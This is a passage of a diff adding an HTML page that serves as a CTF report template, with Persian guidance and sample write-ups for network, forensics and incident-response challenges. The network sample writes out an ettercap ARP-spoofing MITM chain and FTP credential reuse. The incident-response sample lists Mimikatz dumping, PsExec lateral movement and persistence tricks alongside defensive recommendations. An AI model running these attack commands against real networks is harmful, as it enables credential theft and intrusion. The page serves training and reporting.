+                    [Attacker: 10.10.10.99]`
+                    },
+                    {
+                        title: 'Network Reconnaissance',
+                        hint: 'شناسایی شبکه:',
+                        bullets: ['هاست‌های فعال', 'پورت‌ها', 'OS', 'DNS'],
+                        example: `<span class="cmd">Network Scan:</span>
+$ nmap -sn 10.10.10.0/24
+<span class="output">
+Nmap scan report for 10.10.10.1   (Gateway)
+Nmap scan report for 10.10.10.20  (ftp-server.local)
+Nmap scan report for 10.10.10.30  (web.local)
+Nmap scan report for 10.10.10.40  (client-pc.local)</span>
+
+<span class="cmd">Port Scan - FTP Server:</span>
+$ nmap -sV 10.10.10.20
+<span class="output">PORT   STATE SERVICE VERSION
+<span class="important">21/tcp open  ftp     ProFTPD 1.3.5</span>
+22/tcp open  ssh     OpenSSH 7.9</span>`
+                    },
+                    {
+                        title: 'Service & Traffic Analysis',
+                        hint: 'تحلیل ترافیک و سرویس:',
+                        bullets: ['پروتکل‌ها', 'فیلترها', 'داده‌های جالب', 'الگوها'],
+                        example: `<span class="cmd">PCAP Analysis with Wireshark:</span>
+<span class="cmd">File:</span> capture.pcap (5.2 MB)
+<span class="cmd">Duration:</span> 15 minutes of traffic
+
+<span class="cmd">Filters Applied:</span>
+• <span class="cmd">ftp</span> → Found FTP traffic on port 21
+• <span class="cmd">ftp.request.command == "USER"</span> → Login attempts
+• <span class="cmd">http.request.method == "POST"</span> → Credential submissions
+
+<span class="cmd">Key Findings:</span>
+<span class="output">FTP Traffic (Unencrypted!):
+Frame 342: USER admin
+Frame 344: PASS <span class="important">SuperSecretPass123!</span> ← Credentials in CLEARTEXT!
+Frame 346: STOR secret_file.zip</span>
+
+<span class="important">→ FTP credentials captured from unencrypted traffic!</span>`
+                    },
+                    {
+                        title: 'Attack / Exploitation',
+                        hint: 'حمله و بهره‌برداری:',
+                        bullets: ['نوع حمله', 'ابزار', 'تنظیمات', 'نتیجه'],
+                        example: `<span class="cmd">Attack Type:</span> <span class="important">ARP Spoofing + FTP Credential Sniffing</span>
+
+<span class="cmd">MITM Attack Setup:</span>
+$ echo 1 > /proc/sys/net/ipv4/ip_forward
+$ <span class="cmd">ettercap -T -M arp:remote /10.10.10.40/ /10.10.10.20/</span>
+
+<span class="output">[INFO] ARP poisoning victims: 10.10.10.40 <-> 10.10.10.20
+[INFO] Sniffing traffic on eth0...</span>
+
+<span class="cmd">Credentials Captured via Wireshark:</span>
+<span class="output">Protocol: FTP (Unencrypted)
+Username: admin
+Password: <span class="important">SuperSecretPass123!</span>
+Server: 10.10.10.20:21</span>
+
+<span class="important">→ Attack SUCCESSFUL - Credentials Obtained ✓</span>`
+                    },
+                    {
+                        title: 'Access or Impact',
+                        hint: 'دسترسی یا تأثیر:',
+                        bullets: ['Credentialها', 'دسترسی', 'داده‌ها', 'تأثیر'],
+                        example: `<span class="cmd">Using Captured Credentials:</span>
+$ <span class="cmd">ftp 10.10.10.20</span>
+Name: <span class="cmd">admin</span>
+Password: <span class="cmd">SuperSecretPass123!</span>
+<span class="output">230 Login successful.
+ftp> ls
+-rw-r--r--  1 admin admin   1024 flag.txt
+-rw-r--r--  1 admin admin  20480 secret_file.zip</span>
+
+<span class="cmd">Download Flag:</span>
+ftp> <span class="cmd">get flag.txt</span>
+<span class="output">local: flag.txt remote: flag.txt
+1024 bytes received in 0.05 secs</span>
+
+<span class="important">→ Full FTP Access Gained ✓</span>`
+                    },
+                    {
+                        title: 'Flag Acquisition',
+                        hint: 'پیدا کردن flag:',
+                        bullets: ['محل flag', 'مقدار', 'روش استخراج', 'پروتکل'],
+                        example: `<span class="cmd">Flag Location:</span> FTP Server (10.10.10.20) - /home/admin/flag.txt
+<span class="cmd">Extraction Method:</span> FTP GET command using captured credentials
+<span class="cmd">Protocol:</span> FTP (Port 21)
+
+$ cat flag.txt
+<span class="flag">CTF{sniffed_ftp_credentials_2024}</span>
+
+<span class="important">→ Flag Acquired via Network Sniffing ✓</span>
+
+<span class="cmd">Alternative Method:</span>
+If flag was in PCAP data stream:
+<span class="cmd">Wireshark → Follow TCP Stream → Found flag in data</span>`
+                    },
+                    {
+                        title: 'Evidence & Commands',
+                        hint: 'شواهد و دستورات:',
+                        bullets: ['PCAP file', 'اسکرین‌شات', 'دستورات', 'خروجی'],
+                        example: `<span class="cmd">Evidence Files:</span>
+• capture.pcap (original network capture)
+• ettercap_log.txt (MITM attack log)
+• ftp_session.log (FTP commands)
+
+<span class="cmd">Complete Commands:</span>
+1. nmap -sn 10.10.10.0/24
+2. nmap -sV 10.10.10.20
+3. wireshark capture.pcap (apply filter: ftp)
+4. echo 1 > /proc/sys/net/ipv4/ip_forward
+5. ettercap -T -M arp:remote /10.10.10.40/ /10.10.10.20/
+6. ftp 10.10.10.20 (login with captured creds)
+7. get flag.txt
+8. cat flag.txt
+
+<span class="cmd">Screenshots:</span> [wireshark_ftp.png, ettercap_mitm.png, ftp_flag.png]`
+                    },
+                    {
+                        title: 'Conclusion',
+                        hint: 'جمع‌بندی:',
+                        bullets: ['خلاصه', 'پروتکل آسیب‌پذیر', 'پیشنهادات', 'زمان'],
+                        example: `<span class="cmd">Summary:</span>
+Network traffic analysis revealed unencrypted FTP communication.
+ARP spoofing MITM attack captured admin credentials in cleartext.
+FTP server accessed with captured credentials → flag retrieved.
+
+<span class="cmd">Vulnerable Protocol:</span> FTP (Unencrypted - Cleartext Authentication)
+
+<span class="cmd">Recommendations:</span>
+• Replace FTP with SFTP or FTPS (encrypted)
+• Implement network segmentation
+• Use switch-level security (DHCP snooping, Dynamic ARP inspection)
+• Monitor for ARP spoofing attempts
+
+<span class="cmd">Time Taken:</span> ~35 minutes
+<span class="cmd">Difficulty:</span> Medium`
+                    }
+                ]
+            },
+            forensics: {
+                name: 'Digital Forensics',
+                badgeClass: 'badge-forensics',
+                tips: [
+                    'همیشه hash فایل evidence اصلی را محاسبه و ثبت کنید',
+                    'نوع فایل را با دستور file تأیید کنید (تکیه به پسوند نکنید)',
+                    'ابزارها را با نسخه دقیق ذکر کنید',
+                    'اگر steganography بود، روش استخراج را کامل شرح دهید',
+                    'Timeline رویدادها را در صورت نیاز رسم کنید',
+                    'فایل‌های استخراج‌شده را با hash مستند کنید'
+                ],
+                sections: [
+                    {
+                        title: 'Challenge & Evidence',
+                        hint: 'مشخصات چالش و فایل evidence:',
+                        bullets: ['نوع چالش', 'فایل دریافتی', 'hash', 'توضیح'],
+                        example: `<span class="cmd">Challenge Type:</span> <span class="important">Memory Forensics (Windows Memory Dump)</span>
+<span class="cmd">Evidence File:</span> memdump.raw
+<span class="cmd">File Size:</span> 2.1 GB
+<span class="cmd">File Hash:</span>
+MD5:  a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6
+SHA256: 1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b...
+
+<span class="cmd">Challenge Description:</span>
+"An attacker compromised this Windows machine.
+Find the flag hidden in memory."`
+                    },
+                    {
+                        title: 'Initial Analysis',
+                        hint: 'تحلیل اولیه فایل:',
+                        bullets: ['نوع فایل', 'ساختار', 'ابزارها', 'مشاهدات'],
+                        example: `<span class="cmd">File Type Identification:</span>
+$ <span class="cmd">file memdump.raw</span>
+<span class="output">memdump.raw: Windows Memory Dump (Win10 x64)</span>
+
+<span class="cmd">Tool Selected:</span> <span class="important">Volatility 3</span> (v2.7.1)
+<span class="cmd">Profile Detection:</span>
+$ <span class="cmd">vol3 -f memdump.raw windows.info</span>
+<span class="output">OS: Windows 10 (Build 19041)
+Architecture: x64
+Number of Processes: 87</span>
+
+<span class="cmd">Initial Observations:</span>
+• Windows 10 memory dump
+• 87 running processes
+• Suspicious process names noted (explorer.exe running from Temp folder?)`
+                    },
+                    {
+                        title: 'Evidence Examination',
+                        hint: 'بررسی عمیق شواهد:',
+                        bullets: ['ابزارها', 'تنظیمات', 'داده‌های استخراجی', 'Metadata'],
+                        example: `<span class="cmd">Process List:</span>
+$ <span class="cmd">vol3 -f memdump.raw windows.pslist</span>
+<span class="output">PID   Process Name
+...
+<span class="important">4528  notepad.exe</span>      ← Suspicious! Why is notepad running?
+<span class="important">5120  cmd.exe</span>           ← Command shell active
+<span class="important">6200  powershell.exe</span>    ← PowerShell session</span>
+
+<span class="cmd">Command Line Analysis:</span>
+$ <span class="cmd">vol3 -f memdump.raw windows.cmdline</span>
+<span class="output">notepad.exe (PID 4528): 
+  cmdline: "C:\\Windows\\System32\\notepad.exe" <span class="important">C:\\temp\\secret.txt</span>
+  
+powershell.exe (PID 6200):
+  cmdline: powershell -enc <span class="important">base64_encoded_command</span></span>
+
+<span class="cmd">Decode Base64:</span>
+$ echo "<span class="important">base64_string</span>" | base64 -d
+<span class="output">$flag = "CTF{m3m0ry_f0r3ns1cs_2024}"
+Set-Content C:\\temp\\flag.txt $flag</span>
+
+<span class="important">→ Flag creation command found in PowerShell history!</span>`
+                    },
+                    {
+                        title: 'Findings & Data Extraction',
+                        hint: 'یافته‌ها و استخراج:',
+                        bullets: ['داده‌های مخفی', 'روش استخراج', 'رمزگشایی', 'فایل‌ها'],
+                        example: `<span class="cmd">Extract Notepad Content:</span>
+$ <span class="cmd">vol3 -f memdump.raw windows.memmap --pid 4528 --dump</span>
+<span class="output">Memory dumped to pid.4528.dmp</span>
+
+$ <span class="cmd">strings pid.4528.dmp | grep -i "ctf{"</span>
+<span class="flag">CTF{m3m0ry_f0r3ns1cs_2024}</span>
+
+<span class="cmd">Alternative - Extract File from Memory:</span>
+$ <span class="cmd">vol3 -f memdump.raw windows.filescan | grep "flag.txt"</span>
+<span class="output">0xa1b2c3d4  C:\\temp\\flag.txt</span>
+
+$ <span class="cmd">vol3 -f memdump.raw windows.dumpfiles --virtaddr 0xa1b2c3d4</span>
+<span class="output">flag.txt extracted successfully</span>
+
+$ cat flag.txt
+<span class="flag">CTF{m3m0ry_f0r3ns1cs_2024}</span>`
+                    },
+                    {
+                        title: 'Flag Acquisition',
+                        hint: 'پیدا کردن flag:',
+                        bullets: ['محل', 'مقدار', 'مراحل', 'ابزار نهایی'],
+                        example: `<span class="cmd">Flag Location:</span> Memory dump → PowerShell command history + Notepad memory
+<span class="cmd">Final Extraction Method:</span>
+1. Identified suspicious notepad.exe process
+2. Found PowerShell command creating flag.txt in history
+3. Extracted flag from notepad memory dump
+
+<span class="cmd">Flag:</span> <span class="flag">CTF{m3m0ry_f0r3ns1cs_2024}</span>
+
+<span class="important">→ Flag Acquired via Memory Analysis ✓</span>
+
+<span class="cmd">Alternative Paths Explored:</span>
+• Checked browser history → No flag
+• Checked clipboard data → No flag
+• Checked registry → Flag found in RunMRU key (backup)`
+                    },
+                    {
+                        title: 'Evidence Summary',
+                        hint: 'خلاصه شواهد:',
+                        bullets: ['لیست یافته‌ها', 'Timeline', 'فایل‌ها', 'hashها'],
+                        example: `<span class="cmd">All Findings:</span>
+1. Windows 10 Memory Dump (Build 19041)
+2. 87 Processes identified
+3. Suspicious notepad.exe (PID 4528) accessing secret.txt
+4. PowerShell command creating flag.txt discovered
+5. Flag extracted from notepad memory
+
+<span class="cmd">Timeline (from memory):</span>
+14:22 - User logged in
+14:25 - cmd.exe launched
+14:26 - PowerShell script executed (flag creation)
+14:27 - notepad.exe opened secret.txt
+14:30 - Memory dump captured
+
+<span class="cmd">Extracted Files:</span>
+• pid.4528.dmp (MD5: ...)
+• flag.txt (MD5: ...)
+• powershell_history.txt`
+                    },
+                    {
+                        title: 'Conclusion',
+                        hint: 'جمع‌بندی:',
+                        bullets: ['خلاصه', 'روش حمله', 'ابزارهای کلیدی', 'زمان'],
+                        example: `<span class="cmd">Summary:</span>
+Memory forensics performed on Windows 10 dump using Volatility 3.
+Suspicious process chain identified (cmd → powershell → notepad).
+Flag found in PowerShell command history and notepad memory.
+
+<span class="cmd">Key Tools Used:</span>
+• Volatility 3 (Memory Analysis)
+• strings (Data extraction)
+• base64 (Decoding)
+
+<span class="cmd">Attacker Activity Reconstructed:</span>
+1. Attacker gained access via unknown method
+2. Executed PowerShell to create flag.txt in C:\\temp
+3. Opened file in notepad (leaving traces in memory)
+4. Flag persisted in process memory even after file deletion
+
+<span class="cmd">Time Taken:</span> ~40 minutes
+<span class="cmd">Difficulty:</span> Medium-Hard`
+                    }
+                ]
+            },
+            incident: {
+                name: 'Incident Response',
+                badgeClass: 'badge-incident',
+                tips: [
+                    'IOCها را با فرمت استاندارد (IP, Hash, Domain, File Path) ثبت کنید',
+                    'Timeline را با timezone مشخص بنویسید',
+                    'MITRE ATT&CK Techniques را در صورت امکان ذکر کنید',
+                    'منبع هر evidence را مشخص کنید (Windows Event Log, Sysmon, Firewall)',
+                    'حساب‌های compromised را با سطح دسترسی ثبت کنید',
+                    'اگر persistence پیدا کردید، مکانیزم دقیق را شرح دهید'
+                ],
+                sections: [
+                    {
+                        title: 'Incident Overview',
+                        hint: 'نمای کلی رخداد:',
+                        bullets: ['نوع رخداد', 'تاریخ/زمان', 'شدت', 'سیستم‌های درگیر'],
+                        example: `<span class="cmd">Incident Type:</span> <span class="important">Unauthorized Access / Data Exfiltration</span>
+<span class="cmd">Date Detected:</span> 2024-03-15 09:30 UTC
+<span class="cmd">Reported By:</span> SOC Analyst (SIEM Alert)
+<span class="cmd">Severity:</span> <span class="important">Critical (P1)</span>
+<span class="cmd">Affected Systems:</span>
+• WIN-WORKSTATION-07 (10.10.10.107) - Compromised endpoint
+• FILE-SERVER-02 (10.10.10.202) - Accessed by attacker
+• Domain Controller (10.10.10.1) - Suspicious authentication
+
+<span class="cmd">Initial Alert:</span>
+"Multiple failed login attempts followed by successful login
+from external IP 185.220.xxx.xxx on WIN-WORKSTATION-07" `
+                    },
+                    {
+                        title: 'Evidence & Initial Findings',
+                        hint: 'شواهد و یافته‌های اولیه:',
+                        bullets: ['منبع evidence', 'IOCهای اولیه', 'هشدارها', 'ابزارها'],
+                        example: `<span class="cmd">Evidence Sources:</span>
+• <span class="important">Windows Event Logs</span> (Security.evtx, System.evtx)
+• <span class="important">Sysmon Logs</span> (Event ID 1, 3, 8, 11)
+• Firewall Logs (Palo Alto)
+• EDR Alerts (CrowdStrike)
+
+<span class="cmd">Initial IOCs:</span>
+• <span class="important">Source IP:</span> 185.220.101.xxx (Tor Exit Node)
+• <span class="important">Compromised Account:</span> jsmith (Domain User)
+• <span class="important">Suspicious Process:</span> powershell.exe spawning from wmiprvse.exe
+• <span class="important">File Created:</span> C:\\Windows\\Temp\\payload.exe
+
+<span class="cmd">EDR Alert:</span>
+"PowerShell encoded command detected on WIN-WORKSTATION-07
+Process chain: wmiprvse.exe → powershell.exe -enc [base64]"
+<span class="important">Severity: Critical</span>`
+                    },
+                    {
+                        title: 'Attack / Compromise Analysis',
+                        hint: 'تحلیل حمله و نفوذ:',
+                        bullets: ['بردار حمله', 'آسیب‌پذیری', 'تکنیک‌های attacker', 'MITRE ATT&CK'],
+                        example: `<span class="cmd">Initial Access Vector:</span> <span class="important">Brute Force RDP (Port 3389)</span>
+
+<span class="cmd">MITRE ATT&CK Mapping:</span>
+• <span class="cmd">T1110.001</span> - Brute Force: Password Guessing
+• <span class="cmd">T1059.001</span> - Command & Scripting: PowerShell
+• <span class="cmd">T1047</span> - Windows Management Instrumentation (WMI)
+• <span class="cmd">T1003.001</span> - OS Credential Dumping: LSASS Memory
+
+<span class="cmd">Attack Timeline (from logs):</span>
+08:15 - Brute force RDP started (500+ failed logins)
+08:32 - <span class="important">Successful login as jsmith</span>
+08:34 - WMI executed PowerShell
+08:35 - Mimikatz dumped LSASS credentials
+08:38 - Lateral movement to FILE-SERVER-02 via SMB
+08:42 - Data exfiltration started (ZIP archive created)
+
+<span class="cmd">Vulnerability Exploited:</span>
+• Weak password policy (jsmith password: "Summer2023!")
+• RDP exposed to internet without MFA`
+                    },
+                    {
+                        title: 'Attacker Activity',
+                        hint: 'فعالیت مهاجم:',
+                        bullets: ['حساب‌های compromised', 'دستورات', 'فایل‌ها', 'حرکت lateral'],
+                        example: `<span class="cmd">Compromised Accounts:</span>
+1. <span class="important">jsmith</span> (Domain User) - Initial breach
+2. <span class="important">svc_backup</span> (Service Account) - Dumped from LSASS
+3. <span class="important">Administrator</span> - Pass-the-Hash attack
+
+<span class="cmd">Commands Executed (from Sysmon):</span>
+<span class="cmd">1. Initial Recon:</span>
+cmd.exe /c "whoami && net user && ipconfig /all"
+
+<span class="cmd">2. Credential Dumping:</span>
+powershell -enc <span class="output">[base64 encoded mimikatz]</span>
+→ Dumped: svc_backup:$aad3b435b...
+
+<span class="cmd">3. Lateral Movement:</span>
+PsExec.exe \\\\FILE-SERVER-02 -u svc_backup cmd.exe
+→ Access to file server gained
+
+<span class="cmd">4. Data Collection:</span>
+powershell Compress-Archive C:\\Shares\\Finance\\* C:\\temp\\exfil.zip
+
+<span class="cmd">Files Created/Modified:</span>
+• C:\\Windows\\Temp\\mimikatz.exe
+• C:\\Windows\\Temp\\lsass.dmp
+• C:\\temp\\exfil.zip (2.3 GB)`
+                    },
+                    {
+                        title: 'Persistence & Impact',
+                        hint: 'ماندگاری و تأثیر:',
+                        bullets: ['مکانیزم persistence', 'تأثیر', 'داده‌های exfiltrated', 'Backdoor'],
+                        example: `<span class="cmd">Persistence Mechanisms Found:</span>
+<span class="important">1. Scheduled Task (WIN-WORKSTATION-07):</span>
+Name: "WindowsUpdateCheck"
+Command: powershell.exe -enc [base64_reverse_shell]
+Trigger: Every 30 minutes
+
+<span class="important">2. Registry Run Key:</span>
+HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+"WindowsService" = "C:\\Windows\\Temp\\payload.exe"
+
+<span class="important">3. New Local User Created:</span>
+Username: "helpdesk"
+Password: "Support@2024!"
+Groups: Administrators, Remote Desktop Users
+
+<span class="cmd">Impact Assessment:</span>
+• Data Exfiltrated: <span class="important">2.3 GB of financial data</span> (exfil.zip)
+• Systems Compromised: 2 (Workstation + File Server)
+• Accounts Compromised: 3 (jsmith, svc_backup, Administrator)
+• Persistence: 3 mechanisms installed
+
+<span class="important">→ Critical Business Impact - Confidential data exposed</span>`
+                    },
+                    {
+                        title: 'Timeline & IOC',
+                        hint: 'خط زمانی و شاخص‌های نفوذ:',
+                        bullets: ['Timeline کامل', 'IOCها', 'ارتباط رویدادها', 'نمودار'],
+                        example: `<span class="cmd">Complete Timeline:</span>
+08:15 UTC - Brute force RDP started (Source: 185.220.101.xxx)
+08:32 UTC - Successful RDP login as jsmith
+08:34 UTC - WMI executed PowerShell
+08:35 UTC - Mimikatz dumped LSASS
+08:38 UTC - SMB connection to FILE-SERVER-02
+08:42 UTC - Data archived (exfil.zip created)
+08:50 UTC - Scheduled Task persistence created
+09:15 UTC - SOC detected suspicious activity
+09:30 UTC - Incident declared
+
+<span class="cmd">Indicators of Compromise (IOCs):</span>
+<span class="cmd">IP Addresses:</span>
+• 185.220.101.xxx (Attacker IP - Tor Exit Node)
+• 45.155.205.xxx (C2 Server)
+
+<span class="cmd">File Hashes (SHA256):</span>
+• mimikatz.exe: e3b0c44298fc1c14...
+• payload.exe:  d2a84f5b8b61e3c7...
+
+<span class="cmd">Persistence IOCs:</span>
+• Scheduled Task: "WindowsUpdateCheck"
+• Registry: HKLM\\...\\Run\\WindowsService
+• User: helpdesk (SID S-1-5-21-...)`
+                    },
+                    {
+                        title: 'Flag Acquisition',
+                        hint: 'پیدا کردن flag:',
+                        bullets: ['محل flag', 'مقدار', 'ارتباط با حمله', 'روش کشف'],
+                        example: `<span class="cmd">Flag Location:</span> Found in attacker's exfiltration archive metadata
+<span class="cmd">Discovery Method:</span>
+$ strings exfil.zip | grep -i "ctf{"
+<span class="output">flag_comment: CTF{incident_response_timeline_2024}</span>
+
+<span class="cmd">Alternative Location:</span>
+Also found in registry key created by attacker:
+HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\<span class="important">Debug</span>
+Value: "flag" = "<span class="flag">CTF{incident_response_timeline_2024}</span>"
+
+<span class="important">→ Flag found in attacker artifacts ✓</span>
+
+<span class="cmd">Significance:</span>
+The flag was embedded in attacker's tools, confirming this was a CTF scenario.`
+                    },
+                    {
+                        title: 'Conclusion',
+                        hint: 'جمع‌بندی نهایی:',
+                        bullets: ['خلاصه', 'Root Cause', 'توصیه‌ها', 'Lessons Learned'],
+                        example: `<span class="cmd">Executive Summary:</span>
+A brute force attack on exposed RDP service led to full network compromise.
+Attacker gained initial access via weak password, escalated privileges through
+credential dumping, and exfiltrated 2.3 GB of sensitive financial data.
+Three persistence mechanisms were installed for continued access.
+
+<span class="cmd">Root Cause:</span>
+• RDP (3389) exposed to internet without VPN or MFA
+• Weak password policy (no complexity requirements)
+• No account lockout policy configured
+• EDR detection delayed (1 hour gap)
+
+<span class="cmd">Recommendations:</span>
+1. <span class="important">Immediate:</span> Block RDP from internet, enforce VPN + MFA
+2. <span class="important">Short-term:</span> Reset all compromised account passwords
+3. <span class="important">Long-term:</span> Implement LAPS, Privileged Access Workstations
+4. Enable Windows Defender Credential Guard
+5. Deploy honeypot accounts for early detection
+
+<span class="cmd">Lessons Learned:</span>
+• Never expose RDP directly to internet
+• Regular password audits are essential
+• SIEM correlation rules need tuning
+
+<span class="cmd">Time to Detect:</span> ~1 hour
+<span class="cmd">Time to Respond:</span> ~3 hours
+<span class="cmd">Difficulty:</span> Medium (Investigation), Hard (Full Remediation)`
+                    }
+                ]
+            }
+        };
+
+        let currentCategory = 'linux';
+
+        function switchCategory(cat, btn) {
+            currentCategory = cat;
+            document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+            btn.classList.add('active');
+
+            const data = reportData[cat];
+            document.getElementById('badge').textContent = data.name;
+            document.getElementById('badge').className = 'badge ' + data.badgeClass;
+
+            renderSections(cat);
+            renderTips(cat);
+        }
+
+        function renderSections(cat) {
+            const data = reportData[cat];
+            const body = document.getElementById('cardBody');
+            let html = '';
+
+            data.sections.forEach((sec, i) => {
+                html += `
+                <div class="section-block open">
+                    <div class="section-header" onclick="this.parentElement.classList.toggle('open')">
+                        <span class="section-num">${i + 1}</span>
+                        <span class="section-title-text">${sec.title}</span>
+                        <span class="section-arrow">▼</span>
+                    </div>
+                    <div class="section-content">
+                        <div class="hint-box">
+                            <div class="hint-label">📌 راهنما</div>
+                            <div class="hint-text">
+                                ${sec.hint}
+                                <ul>${sec.bullets.map(b => `<li>${b}</li>`).join('')}</ul>
+                            </div>
+                        </div>
+                        <div class="example-box">${sec.example}</div>
+                    </div>
+                </div>`;
+                if (i < data.sections.length - 1) {
+                    html += '<div class="flow-arrow">↓</div>';
+                }
+            });
+
+            body.innerHTML = html;
+        }
+
+        function renderTips(cat) {
+            const data = reportData[cat];
+            document.getElementById('tipsList').innerHTML = data.tips.map(t => `<li>${t}</li>`).join('');
+        }
+
+        // Init
+        document.addEventListener('DOMContentLoaded', () => {
+            renderSections('linux');
+            renderTips('linux');
+        });
+
+        // Keyboard: 1-6 switch categories
+        document.addEventListener('keydown', e => {
+            const map = { '1': 'linux', '2': 'windows', '3': 'web', '4': 'network', '5': 'forensics', '6': 'incident' };
+            if (map[e.key]) {
+                const cat = map[e.key];
+                const btn = document.querySelector(`.tab-btn.${cat}`);
+                if (btn) switchCategory(cat, btn);
+            }
+        });
+    </script>
+</body>
+</html>
